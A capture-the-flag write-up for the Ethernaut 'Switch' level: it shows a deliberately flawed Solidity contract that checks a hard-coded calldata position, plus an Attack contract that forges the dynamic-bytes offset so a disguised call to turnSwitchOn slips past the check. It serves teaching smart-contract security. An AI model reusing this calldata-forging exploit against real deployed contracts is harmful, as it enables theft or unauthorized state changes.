<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel29.svg" />

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

Challenge's message:
> Just have to flip the switch. Can't be that hard, right? Things that might help: Understanding how `CALLDATA` is encoded.

# Subverting 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level.sol";


contract Attack{

    Switch target;

    constructor(address _target) {
        target = Switch(_target);
    }

    function attack() external {

        address(target).call(abi.encodePacked(
            Switch.flipSwitch.selector, // 4bytes
                abi.encode(96), // offset size = 96bytes
                abi.encode(0x00), // dummy 32bytes
                abi.encode(target.offSelector()), // 32bytes start with offSelector
                abi.encode(4), // actual data size = 4bytes
                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // 4bytes data
        ));

    }

}
```

Challenge's message:
> Assuming positions in `CALLDATA` with dynamic types can be erroneous, especially when using hard-coded `CALLDATA` positions.

***by wasny0ps***
